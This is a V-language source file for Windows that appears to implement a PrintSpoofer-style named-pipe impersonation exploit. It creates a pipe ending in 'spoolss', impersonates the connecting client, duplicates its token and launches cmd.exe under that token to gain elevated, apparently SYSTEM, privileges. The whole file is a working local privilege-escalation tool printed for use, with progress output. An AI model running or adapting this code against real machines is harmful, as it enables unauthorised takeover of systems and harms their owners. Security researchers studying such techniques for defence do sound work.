module main

#flag windows -lAdvapi32 -lkernel32

struct SID_AND_ATTRIBUTES {
mut:
    sid        voidptr
    attributes int
}

struct TOKEN_USER {
mut:
    user SID_AND_ATTRIBUTES
}

struct PROCESS_INFORMATION {
mut:
    h_process       voidptr
    h_thread        voidptr
    dw_process_id   u32
    dw_thread_id    u32
}

struct STARTUPINFO {
mut:
    cb                 u32
    lp_reserved        &u16
    lp_desktop         &u16
    lp_title           &u16
    dw_x               u32
    dw_y               u32
    dw_x_size          u32
    dw_y_size          u32
    dw_x_count_chars   u32
    dw_y_count_chars   u32
    dw_fill_attributes u32
    dw_flags           u32
    w_show_window      u16
    cb_reserved2       u16
    lp_reserved2       &byte
    h_std_input        voidptr
    h_std_output       voidptr
    h_std_error        voidptr
}

fn C.CreateNamedPipeW(&u16, u32, u32, u32, u32, u32, u32, &C.LPSECURITY_ATTRIBUTES) int
fn C.ConnectNamedPipe(voidptr, voidptr) int
fn C.ImpersonateNamedPipeClient(voidptr) bool
fn C.GetCurrentThread() int
fn C.OpenThreadToken(voidptr, u32, bool, voidptr) bool
fn C.GetTokenInformation(voidptr, u32, voidptr, int, &int) bool
fn C.ConvertSidToStringSidA(voidptr, voidptr) bool
fn C.DuplicateTokenEx(voidptr, u32, voidptr, u32, u32, voidptr) bool
fn C.CreateProcessWithTokenW(voidptr, u32, voidptr, &u16, u32, voidptr, voidptr, STARTUPINFO, PROCESS_INFORMATION) bool


fn main() {
    pipe_name := r"\\.\pipe\alex\pipe\spoolss"
    println("[*] Creating pipe: ${pipe_name}")
    // PIPE_ACCESS_DUPLEX=0x00000003, PIPE_TYPE_BYTE|PIPE_WAIT=0x00000000, C.NULL=voidptr(0)
    h_pipe := C.CreateNamedPipeW(pipe_name.to_wide(), C.PIPE_ACCESS_DUPLEX, 0, 10, 0x1000, 0x1000, 0, voidptr(0))
    if C.GetLastError() != 0 {
        println(C.INVALID_HANDLE_VALUE)
        println(C.GetLastError())
    } else {
        println("  [!] Created pipe: ${h_pipe}")
    }

    println("[*] Connecting to the pipe...")
    result := C.ConnectNamedPipe(h_pipe, voidptr(0))
    if result == 0 {
        println(C.GetLastError())
    } else {
        println("  [!] New connection ${result}") 
    }

    C.ImpersonateNamedPipeClient(h_pipe)

    mut h_token := &char(0)
    C.OpenThreadToken(C.GetCurrentThread(), 0xF01FF, false, &h_token)
    println("  h_token: ${h_token}")


    token_inf_lenght := 0
    C.GetTokenInformation(h_token, 1, voidptr(0), token_inf_lenght, &token_inf_lenght)
    println("  token_inf_lenght: ${token_inf_lenght}")

    mut token_information := &TOKEN_USER{} 
    C.GetTokenInformation(h_token, 1, &token_information, token_inf_lenght, &token_inf_lenght)
    println("  token_information: ${token_information}")
    println("\n")

    pstr := voidptr(0)
    C.ConvertSidToStringSidA(token_information, &pstr)
    println("[!] Found SID: ${cstring_to_vstring(pstr)}" )

    mut h_system_token := &char(0)
    C.DuplicateTokenEx(h_token, 0xF01FF, voidptr(0), 2, 1, &h_system_token)
    println("  h_system_token: ${h_system_token}")

    process_information := &PROCESS_INFORMATION{}
    startup_info := &STARTUPINFO{}
    cmdline := r"C:\Windows\System32\cmd.exe"
    C.CreateProcessWithTokenW(h_system_token, 0, voidptr(0), cmdline.to_wide(), 0, voidptr(0), voidptr(0), voidptr(&startup_info), voidptr(&process_information))

}
